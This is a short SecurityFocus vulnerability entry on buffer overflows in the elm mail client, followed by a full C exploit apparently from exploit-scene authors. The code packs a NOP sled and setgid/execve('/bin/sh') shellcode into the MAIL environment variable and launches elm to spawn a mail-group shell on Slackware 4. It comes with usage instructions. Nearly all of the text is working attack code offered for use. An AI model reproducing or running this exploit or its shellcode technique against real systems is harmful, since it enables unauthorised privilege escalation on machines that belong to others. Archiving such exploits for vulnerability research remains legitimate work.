source: http://www.securityfocus.com/bid/1276/info

Buffer overflow vulnerabilities exist in elm (Electronic Mail for Unix). 

/*
   Elm Exploit - Scrippie - #Phreak.nl - b0f -
http://b0f.freebsd.lublin.pl

   This exploit spawns an EGID mail shell on the default Slackware 4
install.

 	Use as: elm-smash [mail-gid] [offset]
 
 	Not that EGID=mail has got any use, but hey, think of it as group
         eleviation :)
  
 	Take care and till next time!
 */
 
 #include <stdio.h>
 #define NUMNOPS 193		// If you change this, you gonna have to
 change
 				// the entire sploit ;)
 
 // Shellcode does: setgid(12); execve("/bin/sh");
 char
 shellcode[]="\xeb\x29\x5e\x31\xc0\xb0\x2e\x31\xdb\xb3\x0c\xcd\x80\x89\x76"
 
 "\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
 
 "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd2\xff\xff\xff\x2f\x62\x69\x6e\x2f"
  "\x73\x68";
 
 // Oh no! Where the fuck is my code on the stack?
 unsigned long get_sp(void) {
    __asm__("movl %esp, %eax");
 }
 // Thanx for telling me lad :)
 
 main(int argc, char **argv)
 {
    int i, offset=-300;		// Offset works for my box
    char gid=12;
    long addy;
    char *thaCode;
    char *mailGid;
 
    if(argc > 1) {
       gid = (char) atoi(argv[1]);
       mailGid = (char *)strchr(shellcode, 0x0c);
       *mailGid = gid;
    }
 
    if(argc > 2) offset = atoi(argv[2]);
 
    if(!(thaCode = (char *) malloc(NUMNOPS+sizeof(shellcode)+5))) {
       fprintf(stderr, "Contact your admin and tell him to buy more
 RAM\n");
       exit(-1);
    }
 
    addy = get_sp() - offset;
 
    printf("/-----------------------------------------------\\\n");
    printf("|   Slack 4/Elm exploit - Scrippie              |\n");
    printf("\\-----------------------------------------------/\n");
    printf("Assuming sgid(elm) = %d\n", (int) gid);
    printf("Using ret addr = %x\n", addy);
    printf("You're now EUID=mail, take care :-p\n");
    printf("Please run \"reset\" when this works\n");
    sleep(4);
 
    memset(thaCode, 0x90, NUMNOPS);
    thaCode[NUMNOPS] = 0x00;		// Set to NULL to make strcat() work
    strcat(thaCode, shellcode);
 
    memcpy(thaCode + strlen(thaCode), (void *) &addy, 4);
    setenv("MAIL", thaCode, 1);		// We're going to be nasty now :)
 
    if((execl("/usr/bin/elm", "/usr/bin/elm", NULL)) == -1) {
       perror("execl()");
       exit(-1);
    }
    exit(0);
 }
 